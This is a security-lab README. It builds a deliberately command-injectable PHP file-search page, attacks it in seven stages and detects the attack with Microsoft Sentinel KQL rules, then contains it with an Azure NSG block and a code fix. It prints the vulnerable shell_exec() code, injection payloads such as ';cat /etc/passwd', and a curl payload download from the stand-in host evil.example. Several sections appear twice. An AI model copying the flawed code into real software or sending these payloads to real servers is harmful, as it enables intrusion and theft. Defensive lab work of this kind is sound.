<div align="center">

# 🔴 Vulnerable Web Server Lab – RCE Exploitation, Detection & Incident Response

### Command Injection · Apache Log Ingestion · Microsoft Sentinel · KQL · NSG Containment

![Domain](https://img.shields.io/badge/Type-Offensive%20%2B%20Defensive%20Security%20Lab-red?style=for-the-badge)
![SIEM](https://img.shields.io/badge/SIEM-Microsoft%20Sentinel-blue?style=for-the-badge)
![Attack](https://img.shields.io/badge/Vulnerability-RCE%20%2F%20CWE--78-critical?style=for-the-badge)

<img src="https://img.shields.io/badge/Attack%20Stages-7%20Stage%20Kill%20Chain-red?style=flat-square" />
<img src="https://img.shields.io/badge/Real%20Attacker-103.168.66.101%20%E2%80%94%2082%20Events-critical?style=flat-square" />
<img src="https://img.shields.io/badge/Detection-KQL%20Analytics%20Rule-blue?style=flat-square" />
<img src="https://img.shields.io/badge/MITRE-8%20Techniques%20Mapped-orange?style=flat-square" />
<img src="https://img.shields.io/badge/Containment-NSG%20Deny%20Rule-brightgreen?style=flat-square" />

---

**Prepared by:** Bikash Raya
**Project Type:** Full Offensive-to-Defensive Lab — RCE Exploitation, Log Ingestion, Detection, Investigation & NSG Containment

</div>

---

## 📁 Repository Structure

| File | Description |
| --- | --- |
| [Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.docx](./Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.docx) | Complete lab report with all screenshots and full source code embedded |
| README.md | Project overview |

---

## 📋 Overview

This lab covers the full offensive-to-defensive security lifecycle — building a deliberately vulnerable web application, executing a 7-stage attack chain, ingesting Apache logs into Microsoft Sentinel, detecting the attack with KQL, investigating the incident, and containing it at the network layer.

A PHP web application was deployed with an intentional command injection flaw (CWE-78). After running the 7-stage attack, the VM was left exposed. Within days, real-world threat actor 103.168.66.101 found and exploited the same vulnerability — generating 82 correlated High-severity events in Sentinel.

**What this lab covers:**

* 🏗️ Deployed a vulnerable PHP web app (`shell_exec()` — CWE-78) on Ubuntu + Apache2 in Azure
* ⚔️ Executed a **7-stage attack chain** — recon → RCE → host discovery → user enumeration → process discovery → network discovery → payload retrieval
* 📡 Ingested Apache access logs into Microsoft Sentinel via **Custom Logs AMA** connector
* 🔍 Detected attack commands using **KQL** against the `ApacheHTTPServer_CL` table
* 🚨 Created a **scheduled High-severity analytics rule** mapped to MITRE ATT&CK
* 🌐 Left VM exposed — real attacker **103.168.66.101** independently found and exploited it → **82 correlated Sentinel events** detected and investigated
* 🔎 Investigated with **3 KQL queries** — attack classification, IP identification, timeline reconstruction
* 🛡️ Contained the attack with a **real NSG Deny rule** blocking the attacker IP on port 80

---

## 🛠️ Technologies Used

* Microsoft Azure (VM · NSG · Resource Group)
* Ubuntu Server 24.04 LTS
* Apache2 + PHP + libapache2-mod-php
* Microsoft Sentinel + Microsoft Defender XDR
* Log Analytics Workspace (VulnLab-LAW)
* Custom Logs via AMA (Data Connector)
* KQL (Kusto Query Language)
* Azure NSG (Network Security Groups)
* MITRE ATT&CK Framework

---

## 🧪 Lab Environment

| Component | Value |
| --- | --- |
| Resource Group | Vuln-Web-Lab (Australia East) |
| VM | VulnWeb-VM — Ubuntu Server 24.04 LTS x64 |
| Public IP | 20.5.176.148 |
| Web Server | Apache2 + PHP + libapache2-mod-php |
| Vulnerable Endpoint | `/internal/index.php` — `shell_exec()` — no input sanitization |
| NSG Rule | Port 80 open to internet (intentional) |
| Log Analytics Workspace | VulnLab-LAW |
| Data Connector | Custom Logs via AMA |
| Sentinel Table | `ApacheHTTPServer_CL` |
| Real Attacker IP | 103.168.66.101 |

---

## 🌐 Lab Architecture

```
[Internet — Attacker]
  Local (7-stage attack) + Real attacker 103.168.66.101
           │
           │  HTTP GET /internal/index.php?search=;whoami
           │  Port 80 — NSG Any/Any/Allow (intentional)
           ▼
[VulnWeb-VM — Ubuntu 24.04]
  Apache2 + PHP
  /internal/index.php — shell_exec($input) — NO SANITIZATION
  /var/log/apache2/access.log — all requests including attack commands logged
           │
           │  Custom Logs via AMA + Data Collection Rule
           ▼
[VulnLab-LAW — Log Analytics Workspace]
  Table: ApacheHTTPServer_CL
           │
           ▼
[Microsoft Sentinel]
  KQL Detection → High-Severity Analytics Rule
  → Incident Generated (82 correlated events)
  → 3 KQL Investigation Queries
  → Attack Classified, IP Identified, Timeline Reconstructed
           │
           ▼
[Azure NSG — Block-Malicious-IP-RCE]
  Deny 103.168.66.101 on Port 80 → Attack Contained ✅
```

---

## ⚠️ The Vulnerability — CWE-78 Command Injection

The "Internal File Search Tool" was deployed with an intentional command injection flaw. User input is concatenated directly into a shell command with zero sanitization — this is the vulnerability.

```php
<?php

$result = "";
$error  = "";

if(isset($_GET['search'])) {
    $input = $_GET['search'];

    // INTENTIONALLY VULNERABLE — CWE-78
    $command = "ls " . $input;        // user input concatenated directly into OS command
    $result  = shell_exec($command);   // arbitrary OS command executed on the server
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Search Utility</title>
    <style>
        body { background:#0f172a; font-family:Arial,sans-serif; color:white;
               display:flex; justify-content:center; align-items:center; height:100vh; }
        .container { background:#1e293b; padding:40px; border-radius:12px;
                     width:600px; box-shadow:0 0 25px rgba(0,0,0,0.6); }
        h1 { text-align:center; margin-bottom:30px; }
        input[type="text"] { width:100%; padding:12px; border-radius:6px;
                             border:none; margin-bottom:15px; font-size:16px; }
        button { width:100%; padding:12px; border:none; border-radius:6px;
                 background:#3b82f6; color:white; font-size:16px; cursor:pointer; }
        button:hover { background:#2563eb; }
        .output { background:black; padding:15px; margin-top:20px;
                  border-radius:6px; max-height:250px; overflow-y:auto;
                  font-family:monospace; }
        .footer { margin-top:15px; font-size:12px; text-align:center; color:#94a3b8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Internal File Search Tool</h1>
        <form method="GET">
            <input type="text" name="search" placeholder="Enter directory (e.g. /var/www)">
            <button type="submit">Search</button>
        </form>
        <?php if($result): ?>
        <div class="output">
            <pre><?php echo $result; ?></pre>
        </div>
        <?php endif; ?>
        <div class="footer">Internal DevOps Utility v1.0</div>
    </div>
</body>
</html>
```

> **Why it works:** Appending `;` breaks out of the `ls` command. `?search=;whoami` becomes `ls ;whoami` — both commands execute and the output is returned directly in the browser.

**Saved to:** `/var/www/html/internal/index.php`

---

## ⚔️ 7-Stage Attack Chain

Each stage was executed manually from a browser using crafted URLs — no special tools required. Each stage builds on the previous one, exactly as a real attacker would progress.

| Stage | MITRE | Command | What it reveals |
|-------|-------|---------|-----------------|
| 1 — Reconnaissance | T1590 | URL enumeration `/admin` `/dev` `/internal` | Hidden internal application discovered |
| 2 — Initial Access (RCE) | T1190 | `?search=;whoami` | RCE confirmed — server runs as `www-data` |
| 3 — Host Discovery | T1082 | `?search=;uname -a` | OS version and kernel identified |
| 4 — User Enumeration | T1087 | `?search=;cat /etc/passwd` | All system user accounts listed |
| 5 — Process Discovery | T1057 | `?search=;ps aux` | Running processes and services identified |
| 6 — Network Discovery | T1046 | `?search=;ss -tulnp` | Listening ports and services identified |
| 7 — Payload Retrieval | T1105 | `?search=;curl http://evil.example/payload.sh` | Simulated C2 payload download |

---

## 📡 Apache Log Ingestion into Sentinel

Apache logs every HTTP request — including the injected commands in the URL parameters. By streaming this file into Sentinel, every `;whoami` and `;cat /etc/passwd` becomes searchable and detectable with KQL.

| Setting | Value |
| --- | --- |
| Connector | Custom Logs via AMA |
| Log File | `/var/log/apache2/access.log` |
| DCR Name | ApacheHTTPServer |
| Sentinel Table | `ApacheHTTPServer_CL` |

---

## 🔍 KQL Detection

The detection approach is to search raw Apache log entries for known RCE command keywords. When `;whoami` is injected into the URL, that string appears verbatim in the access log — a simple `has_any()` query surfaces every attack request from the noise of normal traffic.

```kql
ApacheHTTPServer_CL
| where RawData has_any (
    "whoami", "hostname", "uname",
    "/etc/passwd", "ps", "ss",
    "curl", "payload.sh"
)
| project TimeGenerated, RawData
| order by TimeGenerated desc
```

---

## 🚨 Scheduled Analytics Rule

| Setting | Value |
| --- | --- |
| Rule Name | Linux Web Application Command Injection Detection |
| Alert Name | Possible Linux Web Application RCE Attempt |
| Severity | 🔴 **High** |
| Run Every | 5 minutes |
| Lookback | 10 minutes |
| Threshold | Results > 0 |
| Alert Grouping | 24-hour window — consolidates repeated alerts into a single incident |
| MITRE Tactics | Initial Access · Execution · Discovery · C2 |
| MITRE Techniques | T1190 · T1059 · T1082 · T1087 · T1105 |

---

## 🔎 Incident Investigation — 3 KQL Queries

**Incident:** 🔴 High severity | 82 correlated events | Source IP: 103.168.66.101

### Query 1 — Classify the Attack Activity

*Labels each log entry with a readable action type to immediately reveal the attack pattern.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| extend Action = case(
    RawData has "whoami",          "RCE Attempt",
    RawData has "uname",           "System Recon",
    RawData has "cat /etc/passwd", "Credential Access Attempt",
    RawData has "curl",            "External Connection Attempt",
    "Other")
| project TimeGenerated, IP, Action, RawData
| order by TimeGenerated asc
```

### Query 2 — Identify the Attacker IP

*Extracts the source IP and summarises request counts — a high count from a single IP indicates automated or targeted exploitation.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize AttackCount = count() by IP
| order by AttackCount desc
```
✅ **103.168.66.101** confirmed as top attacker — volume and request pattern consistent with automated exploitation.

### Query 3 — Reconstruct the Attack Timeline

*Bins events into 5-minute windows to visualise attack intensity and progression over time.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize count() by bin(TimeGenerated, 5m), IP
| order by TimeGenerated asc
```
✅ Sequential phases visible — initial probing followed by escalating command execution, consistent with automated tooling.

---

## 🛡️ Containment — NSG Deny Rule

Rather than taking the server offline, a targeted NSG Deny rule was created blocking only the attacker IP on port 80 — stopping the attack without impacting legitimate users.

| Field | Value |
| --- | --- |
| Rule Name | Block-Malicious-IP-RCE |
| Source IP | 103.168.66.101 |
| Destination Port | 80 |
| Action | **Deny** |
| Priority | 101 |

**Post-block verification:**
```kql
ApacheHTTPServer_CL
| where RawData has "103.168.66.101"
| order by TimeGenerated desc
```
✅ After the NSG rule was applied, the verification query returned no further requests from that IP — containment confirmed.

---

## 🎯 MITRE ATT&CK Techniques

| Technique | Name | Tactic |
|-----------|------|--------|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command & Scripting Interpreter | Execution |
| T1082 | System Information Discovery | Discovery |
| T1033 | System Owner/User Discovery | Discovery |
| T1087 | Account Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1105 | Ingress Tool Transfer | Command & Control |

---

## 🎯 Skills Demonstrated

* Vulnerable Web Application Deployment (PHP Command Injection — CWE-78)
* 7-Stage Offensive Attack Chain Execution
* Apache Log Ingestion into Sentinel (Custom Logs via AMA + DCR)
* KQL Threat Detection (has_any, extend, case, summarize, bin)
* Scheduled Analytics Rule Creation (High severity, MITRE mapped)
* Real Incident Investigation (3 KQL queries)
* Attack Timeline Reconstruction
* MITRE ATT&CK Mapping (8 techniques)
* NSG-Based Network Containment (real Deny rule)
* Microsoft Sentinel + Defender XDR Unified Portal
* Linux CLI & Azure VM Administration

---

## 🎯 Key Takeaway

> A vulnerable PHP app was built and attacked with a 7-stage kill chain. Sentinel was configured to detect the attack — and a real attacker (103.168.66.101) independently showed up and exploited the same vulnerability, generating 82 real events that were investigated and contained. This lab covered the complete SOC workflow end-to-end: detection, investigation, containment, eradication recommendation, recovery planning, and post-incident review.

---

## 🔗 Related Projects

> Part of the **Bikash Security Lab** series:
> * [Microsoft Sentinel & Defender XDR — SOC IR Lab](https://github.com/Bikash-Raya/Sentinel-Defender-XDR-SOC-Incident-Response-lab)
> * [Microsoft Sentinel — GeoIP Watchlist & Attack Map](https://github.com/Bikash-Raya/microsoft-sentinel-geoip-watchlist-attack-map)
> * [LummaC2 Threat Hunting — Sentinel & Sysmon](https://github.com/Bikash-Raya/Threat-Hunting-Lab-Sentinel-Sysmon--lummac2-)

---

## 🔗 Connect With Me

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/bikash-raya/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/Bikash-Raya)

</div>

---

<div align="center">

⭐ If you find this project useful, feel free to star the repository ⭐

</div>

---

## 🔧 Eradication, Recovery & Post-Incident

> **Lab Scope:** The lab was completed through containment — NSG Deny rule blocking 103.168.66.101 on port 80. The phases below were not executed in this lab. They represent the real-world steps that would follow in a production SOC incident, and are included to demonstrate understanding of the full incident response lifecycle.

---

### Eradication

Containment stops the immediate threat but does not fix the underlying vulnerability. In a production environment, eradication would be handed off to the development team with a formal remediation ticket covering:

- **Code fix:** Replace `shell_exec()` with `escapeshellarg()` to neutralize injected commands — or remove `shell_exec()` entirely and use PHP native functions like `scandir()` which achieve the same result without invoking OS commands
- **Authentication:** The `/internal/` endpoint must be placed behind a login. An internal tool exposed to the public internet with no authentication is a critical gap regardless of whether the code is patched
- **WAF deployment:** A Web Application Firewall should be deployed in front of the web server to inspect HTTP requests and block injection patterns before they reach the application layer
- **Apache access controls:** Restrict `/internal/` to trusted IP ranges — defence in depth on top of the code fix

---

### Recovery

Recovery is the process of safely returning the service to normal operation after eradication is confirmed. Rushing recovery without verification risks re-exposing the same vulnerability:

- Confirm the patched code is live and verify `;whoami` injection now returns an error rather than command output
- Run a post-fix KQL query against `ApacheHTTPServer_CL` to confirm no further attack traffic
- Decide whether the NSG block on `103.168.66.101` should be retained permanently as a layered defence even after the code is fixed
- Monitor `ApacheHTTPServer_CL` for 24-48 hours post-recovery — attackers sometimes return after a short gap to test whether defences have been lifted

**Post-recovery verification:**
```kql
ApacheHTTPServer_CL
| where RawData has "103.168.66.101"
    or RawData has_any ("whoami","passwd","uname","curl","payload")
| project TimeGenerated, RawData
| order by TimeGenerated desc
```

---

### Post-Incident Review

A post-incident review turns a security incident into an improvement opportunity:

- **Detection worked** — the analytics rule triggered within 5 minutes and alert grouping consolidated 82 events into a single manageable incident under real-world attack conditions
- **No authentication on `/internal/`** — any internal tool should require authentication before the code is even reviewed for vulnerabilities. This is a preventable risk
- **Apache logs were sufficient** — centralised log ingestion into Sentinel was essential. Without it this attack would have been completely invisible. No additional forensic tooling was needed to reconstruct the full 7-stage chain
- **The attacker appeared within days** — the window between exposure and exploitation is short. Internet-facing vulnerabilities are found and attacked quickly
- **Network containment is not a substitute for a code fix** — the NSG Deny rule was an effective interim control, but both layers are needed for a complete response

---

---

## 🎯 MITRE ATT&CK Techniques

| Technique | Name | Tactic |
|-----------|------|--------|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command & Scripting Interpreter | Execution |
| T1082 | System Information Discovery | Discovery |
| T1033 | System Owner/User Discovery | Discovery |
| T1087 | Account Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1105 | Ingress Tool Transfer | Command & Control |

---

## 🎯 Skills Demonstrated

* Vulnerable Web Application Deployment (PHP Command Injection — CWE-78)
* 7-Stage Offensive Attack Chain Execution
* Apache Log Ingestion into Sentinel (Custom Logs via AMA + DCR)
* KQL Threat Detection (has_any, extend, case, summarize, bin)
* Scheduled Analytics Rule Creation (High severity, MITRE mapped)
* Real Incident Investigation (3 KQL queries)
* Attack Timeline Reconstruction
* MITRE ATT&CK Mapping (8 techniques)
* NSG-Based Network Containment (real Deny rule)
* Microsoft Sentinel + Defender XDR Unified Portal
* Linux CLI & Azure VM Administration

---

## 🎯 Key Takeaway

> A vulnerable PHP app was built and attacked with a 7-stage kill chain. Sentinel was configured to detect the attack — and a real attacker (103.168.66.101) independently showed up and exploited the same vulnerability, generating 82 real events that were investigated and contained. This lab covered the complete SOC workflow end-to-end: detection, investigation, containment, eradication recommendation, recovery planning, and post-incident review.

---

## 🔗 Related Projects

> Part of the **Bikash Security Lab** series:
> * [Microsoft Sentinel & Defender XDR — SOC IR Lab](https://github.com/Bikash-Raya/Sentinel-Defender-XDR-SOC-Incident-Response-lab)
> * [Microsoft Sentinel — GeoIP Watchlist & Attack Map](https://github.com/Bikash-Raya/microsoft-sentinel-geoip-watchlist-attack-map)
> * [LummaC2 Threat Hunting — Sentinel & Sysmon](https://github.com/Bikash-Raya/Threat-Hunting-Lab-Sentinel-Sysmon--lummac2-)

---

## 🔗 Connect With Me

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/bikash-raya/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/Bikash-Raya)

</div>

---

<div align="center">

⭐ If you find this project useful, feel free to star the repository ⭐

</div>

---

## 🔧 Eradication

Following containment, the root cause was documented and a remediation ticket raised to the development team. The SOC analyst role covers identification and containment — the development team deploys the code fix.

> **Note:** Containment was handled at the network layer via NSG. The code fix was documented and passed to the development team as a remediation ticket — full details and recommended code below.

### Root Cause

The `/internal/index.php` endpoint passes user input directly to `shell_exec()` with no sanitization (CWE-78 / OWASP A03:2021 — Injection). Any attacker who discovers this endpoint can execute arbitrary OS commands as the Apache web server process (`www-data`).

### Recommended Fix — Provided to Development Team

```php
<?php

$result = "";
$error  = "";

if(isset($_GET["search"])) {
    $input = $_GET["search"];

    // SECURE VERSION -- escapeshellarg() neutralizes command injection
    // Wraps input in single quotes and escapes special characters
    // so user input can never break out of the intended ls command
    $safe_input = escapeshellarg($input);

    // Additional safeguard -- only allow alphanumeric and safe path chars
    if(!preg_match("/^[a-zA-Z0-9\/._-]+$/", $input)) {
        $error = "Invalid input. Only alphanumeric characters and paths are allowed.";
    } else {
        $result = shell_exec("ls " . $safe_input);
    }
}
?>
```

**Additional recommendations included in the remediation ticket:**
- Move `/internal/` behind authentication — never expose internal tools publicly
- Consider replacing `shell_exec()` with PHP native functions (`scandir()`, `glob()`) that do not invoke OS commands
- Deploy a Web Application Firewall (WAF) to block injection patterns at the network layer
- Restrict `/internal/` to trusted IP ranges via Apache access controls

---

## ♻️ Recovery

Recovery is conditional on the development team deploying the code fix. Until then, the NSG Deny rule remains as an interim control.

**Recovery checklist:**
- Confirm patched `index.php` is deployed to `/var/www/html/internal/`
- Verify the fix — test `;whoami` injection — should return an error, not command output
- Run post-recovery KQL query to confirm no further attack traffic
- Monitor `ApacheHTTPServer_CL` for 24-48 hours post-recovery

**Post-recovery verification query:**
```kql
ApacheHTTPServer_CL
| where RawData has "103.168.66.101"
    or RawData has_any ("whoami","passwd","uname","curl","payload")
| project TimeGenerated, RawData
| order by TimeGenerated desc
```
✅ No new entries after the containment timestamp = recovery confirmed. Any entries after that timestamp indicate the attacker found another path — re-investigate immediately.

---

## 📝 Post-Incident Review

### Key Findings
- The `/internal/` endpoint had no authentication and was publicly reachable — access controls should have been in place from the start
- Apache access logs alone provided complete forensic evidence to reconstruct the full 7-stage attack chain
- The analytics rule triggered within 5 minutes of the first attack — detection timing was effective
- Alert grouping (24-hour window) consolidated 82 events into a single incident — far more manageable
- The real-world attacker appeared within days of exposure — confirming that any vulnerable internet-facing service will be discovered and exploited quickly

### Recommendations
- Deploy a Web Application Firewall (WAF) to block injection patterns before they reach the application
- Add authentication to `/internal/` from day one — internal tools should never be publicly accessible without a login
- Run automated vulnerability scanning (e.g. Nessus) before exposing any application — would have caught this command injection immediately
- Avoid `shell_exec()` and use PHP native functions like `scandir()` instead — same functionality, no OS command risk
- Retain the NSG block on 103.168.66.101 permanently — no reason to allow that IP back in
